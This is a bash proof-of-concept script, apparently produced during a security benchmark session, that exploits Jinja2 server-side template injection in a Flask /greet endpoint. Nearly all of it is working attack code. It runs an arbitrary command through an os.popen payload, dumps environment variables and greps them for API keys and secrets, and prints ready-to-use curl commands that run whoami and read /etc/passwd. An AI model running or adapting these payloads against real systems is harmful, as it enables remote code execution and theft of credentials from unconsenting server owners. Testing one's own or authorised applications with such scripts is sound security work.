#!/bin/bash
# POC: Production-ready bash POC for Server-Side Template Injection (SSTI) in Flask /greet endpoint. Tests multiple exploitation vectors and supports custom command execution. Can be used to confirm RCE vulnerability when target is running.
# Target: ./repo
# Created: 2025-11-07T21:36:24.543Z
# Session: benchmark-XBEN-076-24-mhpdcdue

# SSTI RCE POC - Flask /greet Endpoint (Version 3 - Production Ready)
# Demonstrates Jinja2 template injection vulnerability leading to Remote Code Execution
# 
# Usage:
#   ./poc_ssti_rce_greet_endpoint_v3.sh [target_url] [command]
#   ./poc_ssti_rce_greet_endpoint_v3.sh http://localhost:5000 "id"
#   ./poc_ssti_rce_greet_endpoint_v3.sh http://target:5000 "cat /etc/passwd"

TARGET="${1:-http://localhost:5000}"
COMMAND="${2:-id}"
ENDPOINT="/greet"

# URL encode the payload
urlencode() {
    local string="${1}"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "${encoded}"
}

echo "=========================================="
echo "SSTI RCE POC - Flask /greet Endpoint"
echo "Target: $TARGET"
echo "Command: $COMMAND"
echo "=========================================="
echo ""

# Test 1: Basic SSTI Detection (Expression Evaluation 7*7)
echo "[+] Test 1: Basic SSTI Detection"
echo "    Testing: {{7*7}} should return 49"
RESPONSE=$(curl -s -m 10 "${TARGET}${ENDPOINT}?name={{7*7}}" 2>&1)
if [ $? -eq 0 ] && [ ! -z "$RESPONSE" ]; then
    echo "    Response: $RESPONSE"
    if echo "$RESPONSE" | grep -qi "49"; then
        echo "    ✓ CONFIRMED: Template injection works!"
    fi
else
    echo "    ✗ No response from server"
fi
echo ""

# Test 2: RCE with user-specified command
echo "[+] Test 2: Remote Code Execution"
echo "    Executing: $COMMAND"
PAYLOAD="config.__class__.__init__.__globals__[\"os\"].popen(\"${COMMAND}\").read()"
RESPONSE=$(curl -s -m 10 "${TARGET}${ENDPOINT}?name={{${PAYLOAD}}}" 2>&1)
if [ $? -eq 0 ] && [ ! -z "$RESPONSE" ]; then
    echo "    Response: $RESPONSE"
    echo "    ✓ Command execution may have succeeded"
else
    echo "    ✗ No response from server"
fi
echo ""

# Test 3: Environment variable extraction
echo "[+] Test 3: Environment Variables"
PAYLOAD="config.__class__.__init__.__globals__[\"os\"].environ"
RESPONSE=$(curl -s -m 10 "${TARGET}${ENDPOINT}?name={{${PAYLOAD}}}" 2>&1)
if [ $? -eq 0 ] && [ ! -z "$RESPONSE" ]; then
    echo "    Response (first 300 chars): ${RESPONSE:0:300}"
    if echo "$RESPONSE" | grep -qi "api\|key\|secret\|path"; then
        echo "    ✓ Environment variables extracted"
    fi
else
    echo "    ✗ No response from server"
fi
echo ""

# Test 4: Verify vulnerability with basic name parameter
echo "[+] Test 4: Basic Endpoint Check"
RESPONSE=$(curl -s -m 10 "${TARGET}${ENDPOINT}?name=TestUser" 2>&1)
if [ $? -eq 0 ] && [ ! -z "$RESPONSE" ]; then
    echo "    Response: $RESPONSE"
    if echo "$RESPONSE" | grep -qi "hello\|testuser"; then
        echo "    ✓ Endpoint is functional"
    fi
else
    echo "    ✗ Endpoint not responding"
fi
echo ""

echo "=========================================="
echo "POC Execution Complete"
echo "=========================================="
echo ""
echo "EXPLOITATION EXAMPLES:"
echo "1. Simple expression: curl '${TARGET}${ENDPOINT}?name={{7*7}}'"
echo "2. Command execution: curl '${TARGET}${ENDPOINT}?name={{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\").read()}}'"
echo "3. File read: curl '${TARGET}${ENDPOINT}?name={{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /etc/passwd\").read()}}'"
echo ""